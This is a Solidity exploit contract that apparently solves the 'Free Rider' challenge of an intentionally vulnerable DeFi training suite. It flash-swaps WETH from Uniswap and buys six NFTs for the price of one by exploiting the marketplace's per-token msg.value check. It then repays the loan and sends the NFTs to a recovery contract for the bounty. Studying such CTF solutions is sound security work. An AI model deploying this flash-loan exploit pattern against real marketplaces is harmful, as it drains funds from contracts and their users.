// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { FreeRiderNFTMarketplace } from "../../10_free-rider/FreeRiderNFTMarketplace.sol";
import { FreeRiderRecovery } from "../../10_free-rider/FreeRiderRecovery.sol";
import { DamnValuableNFT } from "../../DamnValuableNFT.sol";
import { IUniswapV2Pair } from "../../../build-uniswap/v2/IUniswapV2Pair.sol";
import { WETH } from "../../WETH.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackFreeRider {
    receive() external payable { }

    IUniswapV2Pair public uniswapV2Pair;
    DamnValuableNFT public token;
    WETH public weth;
    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
    FreeRiderRecovery public freeRiderRecovery;
    address public player;

    function attack(
        FreeRiderNFTMarketplace freeRiderNFTMarketplace_,
        DamnValuableNFT token_,
        IUniswapV2Pair uniswapV2Pair_,
        address player_,
        WETH weth_,
        FreeRiderRecovery freeRiderRecovery_
    )
        external
        payable
    {
        uniswapV2Pair = uniswapV2Pair_;
        freeRiderNFTMarketplace = freeRiderNFTMarketplace_;
        weth = weth_;
        token = token_;
        freeRiderRecovery = freeRiderRecovery_;
        player = player_;
        uniswapV2Pair.swap(15 ether, 0, address(this), "0x1");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        weth.withdraw(15 ether);

        uint256[] memory tokens = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokens[i] = i;
        }

        freeRiderNFTMarketplace.buyMany{ value: 15 ether }(tokens);
        uint256 amountToPayBack = 15 ether * 1004 / 1000;
        weth.deposit{ value: amountToPayBack }();
        weth.transfer(address(uniswapV2Pair), amountToPayBack);

        bytes memory data = abi.encode(player);
        for (uint256 i; i < 6; i++) {
            token.safeTransferFrom(address(this), address(freeRiderRecovery), i, data);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
